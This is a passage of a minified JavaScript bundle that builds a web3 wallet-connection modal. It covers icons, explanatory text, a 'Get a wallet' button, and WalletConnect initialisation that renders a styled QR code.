                                        <path d="M20.6666 15.5833C20.6666 14.7308 20.6666 14.3 20.7033 13.9517C20.8648 12.5048 21.5136 11.1559 22.5431 10.1264C23.5725 9.09699 24.9214 8.44822 26.3683 8.28667C26.7166 8.25 27.1475 8.25 28 8.25C28.8525 8.25 29.2833 8.25 29.6316 8.28667C31.0785 8.44822 32.4274 9.09699 33.4569 10.1264C34.4863 11.1559 35.1351 12.5048 35.2966 13.9517C35.3333 14.3092 35.3333 14.7308 35.3333 15.5833V19.7083C35.3333 20.073 35.1884 20.4227 34.9306 20.6806C34.6727 20.9385 34.323 21.0833 33.9583 21.0833C33.5936 21.0833 33.2439 20.9385 32.986 20.6806C32.7282 20.4227 32.5833 20.073 32.5833 19.7083V15.5833C32.5833 14.7308 32.5833 14.3 32.51 13.9517C32.3682 13.2412 32.0192 12.5887 31.5069 12.0764C30.9946 11.5641 30.3421 11.2151 29.6316 11.0733C29.2741 11 28.8525 11 28 11C27.1475 11 26.7166 11 26.3683 11.0733C25.6578 11.2151 25.0053 11.5641 24.493 12.0764C23.9808 12.5887 23.6317 13.2412 23.49 13.9517C23.4166 14.3092 23.4166 14.7308 23.4166 15.5833V19.7083C23.4166 20.073 23.2718 20.4227 23.0139 20.6806C22.756 20.9385 22.4063 21.0833 22.0416 21.0833C21.677 21.0833 21.3272 20.9385 21.0694 20.6806C20.8115 20.4227 20.6666 20.073 20.6666 19.7083V15.5833Z" fill="#E87DE8" />
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M11.5 33.5683C11.5 29.6083 11.5 27.6283 12.3433 26.1525C12.9124 25.1553 13.7386 24.3291 14.7358 23.76C16.2117 22.9167 18.1917 22.9167 22.1517 22.9167H28.44C28.8617 22.9167 29.0817 22.9167 29.265 22.935C31.7675 23.1367 33.2708 25.1625 33.5 27.5C33.7475 25.025 35.4342 22.9167 38.1017 22.9167C39.7986 22.9167 41.4261 23.5908 42.626 24.7907C43.8259 25.9906 44.5 27.6181 44.5 29.315V34.265C44.5 38.225 44.5 40.205 43.6567 41.6808C43.0876 42.678 42.2614 43.5042 41.2642 44.0733C39.7883 44.9167 37.8083 44.9167 33.8483 44.9167H28.4767C28.055 44.9167 27.835 44.9167 27.6517 44.8983C25.1492 44.6967 23.6458 42.6708 23.4167 40.3333C23.1783 42.6983 21.6383 44.7517 19.0992 44.9075L18.4575 44.9167C17.9533 44.9167 17.7058 44.9167 17.495 44.8983C15.9438 44.7952 14.4829 44.1323 13.3836 43.0331C12.2843 41.9338 11.6215 40.4728 11.5183 38.9217C11.5 38.7108 11.5 38.4633 11.5 37.9592V33.5683ZM30.97 33.3208C31.3662 32.7735 31.6036 32.1274 31.6557 31.4537C31.7079 30.78 31.5729 30.105 31.2656 29.5032C30.9584 28.9014 30.4908 28.3962 29.9145 28.0434C29.3382 27.6906 28.6757 27.5039 28 27.5039C27.3243 27.5039 26.6618 27.6906 26.0855 28.0434C25.5092 28.3962 25.0416 28.9014 24.7344 29.5032C24.4271 30.105 24.2921 30.78 24.3443 31.4537C24.3964 32.1274 24.6338 32.7735 25.03 33.3208C25.5392 33.981 26.0194 34.663 26.4692 35.365C26.625 35.7317 26.625 36.1075 26.625 36.5017V38.9583C26.625 39.323 26.7699 39.6727 27.0277 39.9306C27.2856 40.1885 27.6353 40.3333 28 40.3333C28.3647 40.3333 28.7144 40.1885 28.9723 39.9306C29.2301 39.6727 29.375 39.323 29.375 38.9583V36.5017C29.375 36.1075 29.375 35.7225 29.5308 35.365C29.6133 35.1817 30.0625 34.5675 30.97 33.3208Z" fill="#E87DE8" />
                                        <path d="M52.75 0.458336H3.25004C1.98439 0.458336 0.958374 1.48435 0.958374 2.75V52.25C0.958374 53.5157 1.98439 54.5417 3.25004 54.5417H52.75C54.0157 54.5417 55.0417 53.5157 55.0417 52.25V2.75C55.0417 1.48435 54.0157 0.458336 52.75 0.458336Z" stroke="white" stroke-opacity="0.1" stroke-width="0.916667" />
                                    </svg>
                                </div>
                                <div class="text-center">
                                    <h3 class="dark:text-white font-medium text-gray-900">One login for all of web3</h3>
                                    <p class="dark:text-gray-400 text-sm leading-none text-gray-600">Log in to any app by connecting your wallet. Say goodbye to countless passwords!</p>
                                </div>
                            </div>

                            <!-- Section 2 -->
                            <div class="flex flex-col gap-4 items-center">
                                <div class="flex gap-4 justify-center">
                                    <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <mask id="mask0_1_1659" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="56" height="56">
                                            <path d="M0.5 0.895004H55.5V55.895H0.5V0.895004Z" fill="white" />
                                        </mask>
                                        <g mask="url(#mask0_1_1659)">
                                            <path d="M0.5 23.8208C0.5 15.3417 0.5 11.0975 2.30583 7.935C3.52618 5.79492 5.29909 4.02201 7.43917 2.80167C10.6017 0.995834 14.8458 0.995834 23.325 0.995834H32.675C41.1542 0.995834 45.3983 0.995834 48.5608 2.80167C50.7009 4.02201 52.4738 5.79492 53.6942 7.935C55.5 11.0975 55.5 15.3417 55.5 23.8117V33.1617C55.5 41.6408 55.5 45.885 53.6942 49.0475C52.4738 51.1876 50.7009 52.9605 48.5608 54.1808C45.3983 55.9867 41.1542 55.9867 32.675 55.9867H23.325C14.8458 55.9867 10.6017 55.9867 7.43917 54.1808C5.29909 52.9605 3.52618 51.1876 2.30583 49.0475C0.5 45.9033 0.5 41.65 0.5 33.1708V23.8208Z" fill="#1DC956" />
                                            <path d="M15.2583 55.895C11.7566 55.73 9.39162 55.3083 7.43912 54.19C5.29904 52.9697 3.52613 51.1968 2.30579 49.0567C1.00412 46.7833 0.646621 43.9508 0.536621 39.3767L4.34995 38.1117C4.86814 37.9389 5.34118 37.6525 5.7345 37.2735C6.12782 36.8944 6.43148 36.4323 6.62329 35.9208L10.8858 24.5542C11.0515 24.1102 11.3828 23.7476 11.81 23.5425C12.2373 23.3374 12.7274 23.3058 13.1775 23.4542L15.4966 24.2242C15.916 24.3661 16.3726 24.3515 16.782 24.183C17.1915 24.0145 17.5261 23.7035 17.7241 23.3075L20.4375 17.8625C20.6024 17.5353 20.8615 17.265 21.1815 17.0866C21.5014 16.9081 21.8676 16.8295 22.2326 16.8611C22.5976 16.8927 22.9448 17.0329 23.2294 17.2637C23.5139 17.4944 23.7228 17.8052 23.8291 18.1558L27.2941 29.6875C27.3762 29.9628 27.5218 30.2149 27.7192 30.4235C27.9165 30.6322 28.1602 30.7916 28.4304 30.8888C28.7007 30.986 28.99 31.0184 29.2751 30.9833C29.5602 30.9482 29.833 30.8466 30.0716 30.6867L33.1333 28.6425C33.3808 28.4799 33.5853 28.2597 33.7291 28.0008L38.5875 19.0908C38.7205 18.8483 38.9067 18.639 39.1322 18.4787C39.3576 18.3184 39.6164 18.2111 39.8891 18.165L43.6841 17.5325C43.9432 17.4908 44.2082 17.5053 44.4613 17.5749C44.7143 17.6445 44.9494 17.7676 45.1508 17.9358L48.7258 20.9058C49.0773 21.2004 49.5265 21.3525 49.9847 21.3321C50.4429 21.3118 50.8768 21.1204 51.2008 20.7958L55.4358 16.5517C55.5091 18.5683 55.5091 20.9517 55.5091 23.8208V33.1708C55.5091 41.65 55.5091 45.8942 53.7033 49.0567C52.4829 51.1968 50.71 52.9697 48.57 54.19C46.6175 55.3083 44.2616 55.73 40.7416 55.895H15.2675H15.2583Z" fill="#2BEE6C" />
                                            <path d="M0.564144 40.3392L0.518311 38.4142L4.04748 37.2408C4.43589 37.1115 4.79051 36.8971 5.08549 36.6132C5.38046 36.3293 5.60833 35.9832 5.75248 35.6L10.0241 24.2333C10.2727 23.5673 10.7696 23.0235 11.4105 22.7158C12.0514 22.4082 12.7865 22.3607 13.4616 22.5833L15.7808 23.3533C15.9899 23.4231 16.2171 23.4151 16.4208 23.3309C16.6245 23.2467 16.7911 23.092 16.89 22.895L19.6125 17.45C19.8585 16.9562 20.2473 16.5478 20.7285 16.2779C21.2096 16.008 21.7608 15.889 22.3105 15.9365C22.8601 15.9839 23.3828 16.1956 23.8105 16.544C24.2383 16.8924 24.5514 17.3613 24.7091 17.89L28.165 29.4217C28.2057 29.559 28.278 29.6848 28.3762 29.7892C28.4743 29.8935 28.5955 29.9733 28.7301 30.0224C28.8647 30.0714 29.0088 30.0882 29.1511 30.0714C29.2933 30.0547 29.4297 30.0048 29.5491 29.9258L32.6108 27.8817C32.7362 27.8009 32.8401 27.6908 32.9133 27.5608L37.7716 18.66C37.9706 18.2926 38.2506 17.9753 38.5905 17.7323C38.9305 17.4893 39.3213 17.3269 39.7333 17.2575L43.5191 16.625C43.9092 16.5612 44.3085 16.5822 44.6897 16.6866C45.0709 16.791 45.4252 16.9763 45.7283 17.23L49.3033 20.2C49.4785 20.3447 49.7011 20.4192 49.9281 20.409C50.155 20.3988 50.3701 20.3048 50.5316 20.145L55.3716 15.305C55.4175 16.0842 55.445 16.9092 55.4633 17.8075L51.8333 21.4375C51.3489 21.9232 50.7006 22.2103 50.0154 22.2425C49.3303 22.2747 48.6578 22.0497 48.13 21.6117L44.555 18.6325C44.4535 18.55 44.3356 18.4901 44.2091 18.4569C44.0827 18.4237 43.9505 18.4179 43.8216 18.44L40.0358 19.0725C39.8982 19.0938 39.7673 19.1461 39.6529 19.2255C39.5386 19.3049 39.4438 19.4093 39.3758 19.5308L34.5175 28.4408C34.303 28.8286 33.9979 29.1588 33.6283 29.4033L30.5666 31.4475C30.2094 31.6846 29.8016 31.8349 29.3759 31.8863C28.9503 31.9377 28.5184 31.8889 28.115 31.7437C27.7115 31.5986 27.3476 31.3611 27.0523 31.0502C26.757 30.7393 26.5384 30.3637 26.4141 29.9533L22.9491 18.4217C22.896 18.2464 22.7916 18.091 22.6493 17.9756C22.507 17.8602 22.3334 17.7901 22.1509 17.7743C21.9684 17.7585 21.7853 17.7978 21.6253 17.887C21.4653 17.9763 21.3358 18.1114 21.2533 18.275L18.5308 23.72C18.2341 24.311 17.7345 24.7752 17.1234 25.0278C16.5122 25.2803 15.8306 25.3042 15.2033 25.095L12.8841 24.325C12.6591 24.2508 12.4141 24.2666 12.2004 24.3692C11.9868 24.4717 11.8212 24.653 11.7383 24.875L7.47581 36.2417C7.23748 36.8831 6.85854 37.463 6.36681 37.9389C5.87509 38.4148 5.28305 38.7745 4.63414 38.9917L0.564144 40.33V40.3392Z" fill="white" />
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M45.875 18.3117C45.875 19.6488 45.3438 20.9312 44.3983 21.8767C43.4528 22.8222 42.1704 23.3533 40.8333 23.3533C39.4962 23.3533 38.2138 22.8222 37.2683 21.8767C36.3228 20.9312 35.7916 19.6488 35.7916 18.3117C35.7916 16.9745 36.3228 15.6922 37.2683 14.7467C38.2138 13.8012 39.4962 13.27 40.8333 13.27C42.1704 13.27 43.4528 13.8012 44.3983 14.7467C45.3438 15.6922 45.875 16.9745 45.875 18.3117Z" fill="white" />
                                            <path d="M41.75 1.15167V55.84L39.9166 55.9317V1.06917C40.5583 1.0875 41.1725 1.115 41.75 1.16083V1.15167Z" fill="white" />
                                            <path d="M44.0417 18.3117C44.0417 19.1626 43.7036 19.9786 43.102 20.5803C42.5003 21.182 41.6842 21.52 40.8333 21.52C39.9824 21.52 39.1664 21.182 38.5647 20.5803C37.963 19.9786 37.625 19.1626 37.625 18.3117C37.625 17.4608 37.963 16.6447 38.5647 16.043C39.1664 15.4414 39.9824 15.1033 40.8333 15.1033C41.6842 15.1033 42.5003 15.4414 43.102 16.043C43.7036 16.6447 44.0417 17.4608 44.0417 18.3117Z" fill="#2BEE6C" />
                                            <path d="M0.958277 23.8208C0.958277 19.5767 0.958277 16.4142 1.17828 13.9208C1.40744 11.4458 1.84744 9.6675 2.69994 8.16416C3.88173 6.09575 5.59768 4.38296 7.66828 3.205C9.17161 2.34333 10.9408 1.90333 13.4249 1.67416C16.7206 1.46679 20.0233 1.39339 23.3249 1.45416H32.6749C36.9191 1.45416 40.0816 1.45416 42.5749 1.67416C45.0499 1.90333 46.8374 2.34333 48.3316 3.205C50.401 4.38044 52.1169 6.08995 53.2999 8.155C54.1524 9.6675 54.5924 11.4367 54.8216 13.93C55.0416 16.4142 55.0416 19.5767 55.0416 23.8208V33.1708C55.0416 37.4242 55.0416 40.5775 54.8216 43.0708C54.5924 45.5458 54.1524 47.3333 53.2999 48.8275C52.1195 50.8993 50.4034 52.6154 48.3316 53.7958C46.8374 54.6483 45.0591 55.0883 42.5749 55.3175C40.0816 55.5375 36.9191 55.5375 32.6749 55.5375H23.3249C19.0808 55.5375 15.9183 55.5375 13.4249 55.3175C10.9499 55.0883 9.17161 54.6483 7.66828 53.7958C5.59649 52.6154 3.88042 50.8993 2.69994 48.8275C1.84744 47.3333 1.41661 45.555 1.17828 43.0708C0.970653 39.7721 0.897259 36.4663 0.958277 33.1617V23.8117V23.8208Z" stroke="white" stroke-opacity="0.1" stroke-width="0.916667" />
                                        </g>
                                    </svg>
                                    <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <mask id="mask0_1_1671" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="56" height="56">
                                            <path d="M52.75 0.895004H3.25C1.73122 0.895004 0.5 2.12622 0.5 3.645V53.145C0.5 54.6638 1.73122 55.895 3.25 55.895H52.75C54.2688 55.895 55.5 54.6638 55.5 53.145V3.645C55.5 2.12622 54.2688 0.895004 52.75 0.895004Z" fill="white" />
                                        </mask>
                                        <g mask="url(#mask0_1_1671)">
                                            <path d="M52.75 0.895004H3.25C1.73122 0.895004 0.5 2.12622 0.5 3.645V53.145C0.5 54.6638 1.73122 55.895 3.25 55.895H52.75C54.2688 55.895 55.5 54.6638 55.5 53.145V3.645C55.5 2.12622 54.2688 0.895004 52.75 0.895004Z" fill="#C653C6" />
                                            <path d="M48.2584 44.29C48.2584 40.4033 46.9384 35.5358 42.85 32.9233C43.003 32.5949 43.0863 32.2384 43.0946 31.8762C43.1029 31.514 43.036 31.154 42.8982 30.819C42.7604 30.4839 42.5546 30.1811 42.2939 29.9295C42.0332 29.678 41.7231 29.4832 41.3834 29.3575V28.6058C41.3834 27.515 40.9067 26.5342 40.1459 25.8558C40.3783 25.3346 40.5057 24.7727 40.521 24.2022C40.5362 23.6317 40.4388 23.0638 40.2345 22.5309C40.0303 21.9981 39.723 21.5107 39.3303 21.0966C38.9376 20.6825 38.4672 20.3498 37.9459 20.1175V15.0758C37.9459 13.7138 37.6776 12.365 37.1563 11.1066C36.6351 9.84821 35.8711 8.7048 34.908 7.74166C33.9448 6.77853 32.8014 6.01452 31.543 5.49328C30.2846 4.97203 28.9359 4.70375 27.5738 4.70375C26.2117 4.70375 24.863 4.97203 23.6046 5.49328C22.3462 6.01452 21.2028 6.77853 20.2396 7.74166C19.2765 8.7048 18.5125 9.84821 17.9912 11.1066C17.47 12.365 17.2017 13.7138 17.2017 15.0758V17.0467C16.7921 17.2458 16.432 17.5337 16.1478 17.8896C15.8636 18.2454 15.6623 18.6602 15.5587 19.1037C15.455 19.5472 15.4516 20.0082 15.5488 20.4532C15.6459 20.8982 15.841 21.3158 16.12 21.6758C15.2868 22.3973 14.7588 23.4084 14.6431 24.5045C14.5274 25.6005 14.8325 26.6996 15.4967 27.5792C14.4027 28.1421 13.5676 29.1047 13.1648 30.2671C12.7619 31.4296 12.8223 32.7026 13.3334 33.8217C10.5284 37.6075 7.7417 41.43 7.7417 48.1583C7.7417 50.6058 8.08087 52.6133 8.42003 54.0158C8.59788 54.7592 8.82136 55.4908 9.0892 56.2067L9.10753 56.2433V56.2525L9.95087 55.895L9.10753 56.2617L9.34587 56.8117H44.4175L44.6925 56.3625L43.895 55.895L44.6834 56.3533L44.7017 56.3442L44.7292 56.28C44.9151 55.9657 45.0893 55.6446 45.2517 55.3175C45.5817 54.6575 46.0309 53.7225 46.4709 52.6042C47.5667 49.9647 48.1695 47.1468 48.2492 44.29H48.2584Z" fill="#E87DE8" stroke="white" stroke-width="1.83333" />
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M24.7916 27.9367C22.0416 27.4783 19.75 25.1867 19.75 21.52V15.1033C19.75 14.6725 19.75 14.4617 19.7775 14.2783C19.8587 13.6806 20.1343 13.1262 20.5616 12.7005C20.989 12.2748 21.5444 12.0014 22.1425 11.9225C22.3258 11.895 22.5275 11.895 22.9583 11.895C24.7916 11.895 25.25 9.60333 25.25 9.60333C25.25 9.60333 25.25 11.895 27.5416 11.895C28.825 11.895 29.4666 11.895 29.9708 12.1058C30.6428 12.3849 31.1767 12.9189 31.4558 13.5908C31.6666 14.095 31.6666 14.7367 31.6666 16.02V21.52C31.6666 25.1867 28.9166 27.9367 25.7083 27.9367C26.9458 28.1475 29.375 27.9367 31.6666 26.1033V34.8392C31.6666 36.1867 29.375 37.5617 26.1666 37.5617C22.9583 37.5617 20.6666 36.1867 20.6666 34.8392L22.5 32.0617L24.7916 33.4367V27.9367ZM24.3333 43.9783H28.4583C30.75 43.9783 31.2083 47.645 31.2083 49.02H28.4583L27.5416 47.645H24.3333V43.9783ZM18.6041 49.02H22.5V53.145H15.1666C15.1666 52.2283 16.0833 49.02 18.6041 49.02Z" fill="white" />
                                        </g>
                                        <path d="M52.75 1.35333H3.25004C1.98439 1.35333 0.958374 2.37935 0.958374 3.645V53.145C0.958374 54.4107 1.98439 55.4367 3.25004 55.4367H52.75C54.0157 55.4367 55.0417 54.4107 55.0417 53.145V3.645C55.0417 2.37935 54.0157 1.35333 52.75 1.35333Z" stroke="white" stroke-opacity="0.1" stroke-width="0.916667" />
                                    </svg>

                                    <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <mask id="mask0_1_1681" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="56" height="56">
                                            <path d="M55.5 28.395C55.5 13.2072 43.1878 0.895004 28 0.895004C12.8122 0.895004 0.5 13.2072 0.5 28.395C0.5 43.5828 12.8122 55.895 28 55.895C43.1878 55.895 55.5 43.5828 55.5 28.395Z" fill="white" />
                                        </mask>
                                        <g mask="url(#mask0_1_1681)">
                                            <path d="M55.5 28.395C55.5 13.2072 43.1878 0.895004 28 0.895004C12.8122 0.895004 0.5 13.2072 0.5 28.395C0.5 43.5828 12.8122 55.895 28 55.895C43.1878 55.895 55.5 43.5828 55.5 28.395Z" fill="#987DE8" />
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M14.69 26.9008L25.6625 9.20917C25.9091 8.81122 26.2533 8.48282 26.6623 8.25508C27.0714 8.02735 27.5318 7.90782 28 7.90782C28.4682 7.90782 28.9286 8.02735 29.3377 8.25508C29.7467 8.48282 30.0909 8.81122 30.3375 9.20917L41.31 26.9008C41.8459 27.7655 42.1315 28.7619 42.135 29.7792V29.8067C42.1377 30.98 41.7651 32.1235 41.0717 33.07L30.9608 46.9117C30.6205 47.3776 30.1749 47.7567 29.6604 48.018C29.1459 48.2793 28.577 48.4155 28 48.4155C27.423 48.4155 26.8541 48.2793 26.3396 48.018C25.8251 47.7567 25.3795 47.3776 25.0392 46.9117L14.9192 33.07C14.2327 32.1274 13.8635 30.9911 13.865 29.825V29.7975C13.8651 28.774 14.1508 27.7708 14.69 26.9008Z" fill="white" />
                                            <path d="M28.77 10.1625C28.6872 10.0334 28.5733 9.92717 28.4388 9.85351C28.3042 9.77984 28.1534 9.7411 28 9.74084V23.3533L39.55 28.4225C39.6252 27.9777 39.5339 27.5208 39.2933 27.1392L28.77 10.1625Z" fill="#643CDD" />
                                            <path d="M28 9.74083C27.845 9.73954 27.6923 9.77754 27.5561 9.85128C27.4198 9.92502 27.3045 10.0321 27.2208 10.1625L16.6883 27.1483C16.4564 27.5299 16.3716 27.9829 16.45 28.4225L28 23.3533V9.74083Z" fill="#BDADEB" />
                                            <path d="M28 47.2233C28.1423 47.2233 28.2827 47.1902 28.41 47.1266C28.5372 47.0629 28.648 46.9705 28.7333 46.8567L39.0367 32.7583C39.3117 32.355 38.8533 31.8417 38.4317 32.0892L29.3658 37.2958C28.9476 37.5366 28.4734 37.663 27.9908 37.6625V47.2233H28Z" fill="#643CDD" />
                                            <path d="M16.9725 32.7583L27.2575 46.8475C27.4409 47.1042 27.7158 47.2233 27.9908 47.2233V37.6625C27.5114 37.6614 27.0405 37.535 26.625 37.2958L17.5684 32.0892C17.1375 31.8417 16.6792 32.3642 16.9725 32.7583Z" fill="#BDADEB" />
                                            <path d="M39.55 28.4225L28 23.3533V35.3983C28.4826 35.3989 28.9568 35.2724 29.375 35.0317L38.67 29.6875C38.898 29.5522 39.0939 29.369 39.2443 29.1506C39.3946 28.9322 39.4958 28.6838 39.5408 28.4225H39.55Z" fill="#401AB3" />
                                            <path d="M28 35.3983V23.3167L16.45 28.4225C16.4958 28.687 16.5992 28.9383 16.7529 29.1585C16.9065 29.3786 17.1067 29.5624 17.3391 29.6967L26.625 35.0317C27.0432 35.2724 27.5174 35.3989 28 35.3983Z" fill="#7C5AE2" />
                                        </g>
                                        <path d="M55.0417 28.395C55.0417 13.4603 42.9347 1.35333 28 1.35333C13.0653 1.35333 0.958374 13.4603 0.958374 28.395C0.958374 43.3297 13.0653 55.4367 28 55.4367C42.9347 55.4367 55.0417 43.3297 55.0417 28.395Z" stroke="white" stroke-opacity="0.1" stroke-width="0.916667" />
                                    </svg>

                                </div>
                                <div class="text-center">
                                    <h3 class="dark:text-white font-medium text-gray-900">A home for your digital assets</h3>
                                    <p class="dark:text-gray-400 text-sm leading-none text-gray-600">A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs.</p>
                                </div>
                            </div>

                            <!-- Section 3 -->
                            <div class="flex flex-col gap-4 items-center">
                                <div class="flex gap-4 justify-center">
                                    <div class="flex justify-center items-center w-16 h-16 bg-gradient-to-br from-green-400 to-emerald-500 rounded-full">
                                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M16 4L6 14L16 24L26 14L16 4Z" fill="white" />
                                            <path d="M16 28C22.627 28 28 22.627 28 16C28 9.373 22.627 4 16 4C9.373 4 4 9.373 4 16C4 22.627 9.373 28 16 28Z" stroke="white" stroke-width="2" fill="none" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-center items-center w-16 h-16 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-2xl">
                                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <rect x="4" y="4" width="24" height="24" rx="4" fill="white" />
                                            <rect x="8" y="8" width="16" height="4" fill="#3B82F6" />
                                            <rect x="8" y="14" width="12" height="4" fill="#3B82F6" />
                                            <rect x="8" y="20" width="8" height="4" fill="#3B82F6" />
                                        </svg>
                                    </div>
                                    <div class="flex justify-center items-center w-16 h-16 bg-gradient-to-br from-orange-400 to-orange-500 rounded-2xl">
                                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M16 4L4 16L16 28L28 16L16 4Z" fill="white" />
                                            <path d="M16 10L10 16L16 22L22 16L16 10Z" fill="#FB923C" />
                                        </svg>
                                    </div>
                                </div>
                                <div class="text-center">
                                    <h3 class="dark:text-white font-medium text-gray-900">Your gateway to a new web</h3>
                                    <p class="dark:text-gray-400 text-sm leading-none text-gray-600">With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more.</p>
                                </div>
                            </div>

                            <!-- Get a wallet button -->
                            <button class="elmobtn-primary" onclick="window.open('https://chromewebstore.google.com/', '_blank')">
                                <svg width="16" height="13" viewBox="0 0 16 13" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0 3.16494C0 1.72494 1.168 0.564941 2.6 0.564941H11.6C13.04 0.564941 14.2 1.73294 14.2 3.16494V3.38894C14.724 3.5584 15.1807 3.88987 15.5042 4.33558C15.8277 4.78129 16.0013 5.31821 16 5.86894V7.66094C16 8.82094 15.248 9.80494 14.2 10.1409V10.3649C14.2 11.8049 13.032 12.9649 11.6 12.9649H2.6C1.91044 12.9649 1.24912 12.691 0.761522 12.2034C0.273928 11.7158 0 11.0545 0 10.3649L0 3.16494ZM12.6 10.2689H10.696C9.76668 10.2689 8.87543 9.89977 8.2183 9.24264C7.56117 8.58552 7.192 7.69426 7.192 6.76494C7.192 5.83562 7.56117 4.94437 8.2183 4.28724C8.87543 3.63011 9.76668 3.26094 10.696 3.26094H12.6V3.16494C12.6 2.61294 12.152 2.16494 11.6 2.16494H2.6C2.048 2.16494 1.6 2.61294 1.6 3.16494V10.3649C1.6 10.9169 2.048 11.3649 2.6 11.3649H11.6C12.152 11.3649 12.6 10.9169 12.6 10.3649V10.2609V10.2689ZM10.696 4.86094C10.1921 4.86094 9.70882 5.06112 9.3525 5.41744C8.99618 5.77376 8.796 6.25703 8.796 6.76094C8.796 7.26485 8.99618 7.74813 9.3525 8.10444C9.70882 8.46076 10.1921 8.66094 10.696 8.66094H13.4C13.952 8.66094 14.4 8.22094 14.4 7.66894V5.86094C14.4 5.30894 13.952 4.86894 13.4 4.86894H10.696V4.86094Z" fill="white" />
                                </svg>
                                Get a wallet
                            </button>
                        </div>
                    </div>
                    <div id="proccesing_step" class="hidden flex-col justify-center items-center w-full h-full">
                        <div class="items-center p-4 w-full h-full">
                            <div class="flex flex-col gap-2 justify-start items-start w-full h-full" id="status-container">
                            </div>
                        </div>
                    </div>
                    <div id="confirmation_step" class="hidden flex-col justify-start items-start w-full h-full">
                        <div class="items-center p-4 w-full h-full">
                            <div class="flex flex-col gap-2 justify-start items-start w-full h-full" id="status-container">
                            </div>
                        </div>
                    </div>
                    <div id="walletConnect_step" class="hidden flex-col justify-center items-center w-full h-full">
                        <div class="flex flex-col gap-6 justify-center items-center w-full h-full">
                            <div id="walletConnect_step_content" class="flex flex-col gap-4 justify-center items-center p-5 w-full">
                                <span class="loader"></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  `,s.querySelectorAll(".close_modal").forEach(l=>{l.addEventListener("click",()=>{G4()})});const a=s.querySelector("#back_button");a&&a.addEventListener("click",()=>{OYe()});const c=s.querySelector("#wallet-list-container");if(c){const l=Uie(),u=jie(l);c.innerHTML="",c.appendChild(u)}i.appendChild(s)}async function EYe(){try{const r=await fetch("./assets/styles0.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}function _Ye(r){el();const e=Yt.querySelector("#walletConnect_step");if(e){Yt.querySelectorAll(".dot").forEach((n,s)=>{n.classList.remove("active"),s===0&&n.classList.add("active")}),Cn("Initializing..."),Yt.querySelectorAll("#wallet_selected_name").forEach(n=>{n.textContent=r.name}),Yt.querySelectorAll(".image_connected_wallet").forEach(n=>{n.src=r.icon});const i=e.querySelector("#walletConnect_step_content");i.innerHTML=`
      <div id="qrcode-container" class="p-2 mt-4 mb-4 bg-white rounded-2xl" style="max-width: 360px; min-height: 360px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
        <div id="qrcode"></div>
      </div>
      <div class="flex flex-col gap-5">
        <div class="dark:text-white text-sm text-center text-gray-900">Scan this QR Code with your phone</div>
        <div class="dark:text-white text-sm text-center text-gray-900">UX by</div>
      </div>

    `,e.style.display="flex",Hie("walletConnect_step"),setTimeout(()=>{rl()},100)}else console.error("WalletConnect step element not found")}async function SYe(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1}),s=Yt.querySelectorAll(".dot");s.forEach((o,a)=>{o.classList.remove("active"),a===0&&o.classList.add("active")}),Cn("Scan QR Code"),n.on("display_uri",o=>{console.log("Received URI for QR-code:",o),s.forEach((c,l)=>{c.classList.remove("active"),l===1&&c.classList.add("active")}),Cn("Waiting for Connection");const a=rx.getElementById("qrcode");if(a){a.innerHTML="";try{const c=document.createElement("div");c.className="styled-qr-container",c.style.cssText=`
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin: 0 auto;
          `,c.style.animation="qrFadeIn 0.6s ease forwards",z3.toDataURL(o,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}).then(l=>{const u=document.createElement("div");u.style.cssText=`
              position: relative;
              overflow: hidden;
            `;const d=document.createElement("img");d.src=l,d.width=328,d.height=328,d.style.cssText=`
              border-radius: 8px;
              display: block;
              filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
            `;const h=document.createElement("div");h.style.cssText=`
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              width: 40px;
              height: 40px;
              background: white;
              border-radius: 50%;
              display: flex;
              align-items: center;
              justify-content: center;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            `;const f=document.createElement("img");f.src=r.info.icon,f.style.cssText=`
              width: 30px;
              height: 30px;
              border-radius: 50%;
              object-fit: contain;
            `;const p=document.createElement("div");if(p.style.cssText=`
              position: absolute;
              bottom: -10px;
              left: 0;
              right: 0;
              text-align: center;
              font-size: 14px;
              font-weight: 500;
              color: white;
              text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
              transform: translateY(-50%);
            `,h.appendChild(f),u.appendChild(d),u.appendChild(h),c.appendChild(u),c.appendChild(p),a.appendChild(c),setTimeout(()=>{rl()},100),!rx.getElementById("qr-animations")){const g=document.createElement("style");g.id="qr-animations",g.textContent=`
                @keyframes qrFadeIn {
                  from { opacity: 0; transform: scale(0.9); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes qrPulse {
                  0% { transform: scale(1); }
                  50% { transform: scale(1.05); }
                  100% { transform: scale(1); }
                }
                .styled-qr-container:hover {
